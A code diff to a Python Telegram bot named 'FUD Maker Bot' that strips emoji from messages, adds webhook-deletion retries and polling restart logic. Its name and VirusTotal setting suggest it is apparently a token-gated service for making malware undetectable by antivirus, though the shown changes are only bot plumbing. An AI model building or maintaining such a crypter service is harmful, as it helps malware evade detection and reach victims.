@@ -1270,16 +1220,15 @@ async def handle_revoke_token(update: Update, context: ContextTypes.DEFAULT_TYPE
     revoke_token(token)
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await update.message.reply_text(
-        f"✅ Token {token[:12]}... revoked.",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
+        f"Token {token[:12]}... revoked.",
+        reply_markup=InlineKeyboardMarkup(keyboard)
     )
     context.user_data['revoke_step'] = False
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
-    await update.message.reply_text("❌ Cancelled. Send /start to begin.", parse_mode='Markdown')
+    await update.message.reply_text("Cancelled. Send /start to begin.")
     return ConversationHandler.END
 
 # ============ BOT RUNNER ============
@@ -1289,11 +1238,11 @@ def run_bot():
 
     async def bot_main():
         init_db()
-        print("🤖 FUD Maker Bot starting...")
-        print(f"👨‍💻 Developer: {DEVELOPER}")
-        print(f"🛡️ VirusTotal: {'Enabled' if VT_API_KEY else 'Disabled'}")
-        print(f"📢 Channel: {'Configured' if CHANNEL_ID else 'Not set'}")
-        print(f"👑 Admin ID: {ADMIN_CHAT_ID}")
+        print("FUD Maker Bot starting...")
+        print(f"Developer: {DEVELOPER}")
+        print(f"VirusTotal: {'Enabled' if VT_API_KEY else 'Disabled'}")
+        print(f"Channel: {'Configured' if CHANNEL_ID else 'Not set'}")
+        print(f"Admin ID: {ADMIN_CHAT_ID}")
 
         application = Application.builder().token(BOT_TOKEN).build()
 
@@ -1318,54 +1267,60 @@ def run_bot():
         application.add_handler(conv)
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))
 
-        # Delete webhook
-        print("🔄 Deleting webhook...")
-        try:
-            await application.bot.delete_webhook(drop_pending_updates=True)
-            print("✅ Webhook deleted.")
-        except Exception as e:
-            print(f"⚠️ Delete webhook error: {e}")
+        # Force delete webhook with retry
+        print("Deleting webhook...")
+        for attempt in range(5):
+            try:
+                await application.bot.delete_webhook(drop_pending_updates=True)
+                print(f"Webhook deleted (attempt {attempt + 1})")
+                break
+            except Exception as e:
+                print(f"Attempt {attempt + 1} failed: {e}")
+                await asyncio.sleep(2)
 
-        await asyncio.sleep(2)
+        await asyncio.sleep(3)
 
         webhook_info = await application.bot.get_webhook_info()
-        print(f"📡 Webhook URL: {webhook_info.url or 'None'}")
-        print(f"📡 Pending updates: {webhook_info.pending_update_count}")
+        print(f"Webhook URL: {webhook_info.url or 'None'}")
+        print(f"Pending updates: {webhook_info.pending_update_count}")
 
-        print("🤖 Starting bot polling...")
+        print("Starting bot polling...")
         await application.initialize()
         await application.start()
 
+        # Use a different mechanism to avoid conflict
         await application.updater.start_polling(
             drop_pending_updates=True,
             allowed_updates=['message', 'callback_query'],
-            poll_interval=1.0
+            poll_interval=1.0,
+            timeout=10
         )
 
-        print("✅ Bot is running!")
+        print("Bot is running!")
 
         while True:
             try:
                 if not application.updater.running:
-                    print("⚠️ Updater stopped! Restarting...")
+                    print("Updater stopped! Restarting...")
                     await application.updater.start_polling(
                         drop_pending_updates=True,
                         allowed_updates=['message', 'callback_query'],
-                        poll_interval=1.0
+                        poll_interval=1.0,
+                        timeout=10
                     )
-                    print("✅ Updater restarted!")
+                    print("Updater restarted!")
             except Exception as e:
-                print(f"⚠️ Health check error: {e}")
+                print(f"Health check error: {e}")
             await asyncio.sleep(10)
 
     while True:
         try:
             loop.run_until_complete(bot_main())
         except Exception as e:
-            print(f"❌ Bot crashed: {e}")
+            print(f"Bot crashed: {e}")
             import traceback
             traceback.print_exc()
-            print("🔄 Restarting in 5 seconds...")
+            print("Restarting in 5 seconds...")
             time.sleep(5)
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
